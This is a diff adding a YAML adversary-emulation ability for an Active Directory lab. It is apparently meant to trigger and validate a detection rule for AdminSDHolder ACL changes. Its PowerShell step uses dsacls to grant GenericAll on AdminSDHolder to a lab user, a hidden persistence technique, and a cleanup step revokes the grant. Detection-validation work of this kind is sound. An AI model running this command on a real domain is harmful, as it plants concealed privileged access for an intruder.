@@ -1,0 +1,25 @@
+- id: 7f2a1b06-0000-4a06-9b06-0a1b2c3d0006
+  name: "[AAR #6] Persistence - AdminSDHolder ACL modification"
+  description: >
+    Detection-validation ability for the Azure Attack Range lab. On the domain controller,
+    grants GenericAll on the AdminSDHolder object to labuser1, a hidden privilege-revival path,
+    to produce true-positive telemetry for ESCU "Windows AD Admin SDHolder ACL Modified"
+    (T1546, Security 5136, ObjectDN=CN=AdminSDHolder, nTSecurityDescriptor changed).
+    PREREQUISITE (one-time, defensive config): "Directory Service Changes" auditing enabled AND
+    a SACL on AdminSDHolder - see docs/escu-validation-story-01.md rule #6. labuser1 must exist.
+    The sandcat agent runs as SYSTEM on the DC, which holds the rights dsacls needs. Runs on the
+    domain controller only (self-skips on clients). Fully reversible via cleanup.
+  tactic: persistence
+  technique:
+    attack_id: T1546
+    name: "Event Triggered Execution"
+  platforms:
+    windows:
+      psh:
+        command: |
+          if ((Get-CimInstance Win32_ComputerSystem).DomainRole -lt 4) { "skip: not a domain controller"; exit 0 }
+          $dn = "CN=AdminSDHolder,CN=System," + ([ADSI]"LDAP://RootDSE").defaultNamingContext
+          dsacls "$dn" /G "ATTACKRANGE\labuser1:GA"
+        cleanup: |
+          $dn = "CN=AdminSDHolder,CN=System," + ([ADSI]"LDAP://RootDSE").defaultNamingContext
+          dsacls "$dn" /R "ATTACKRANGE\labuser1"
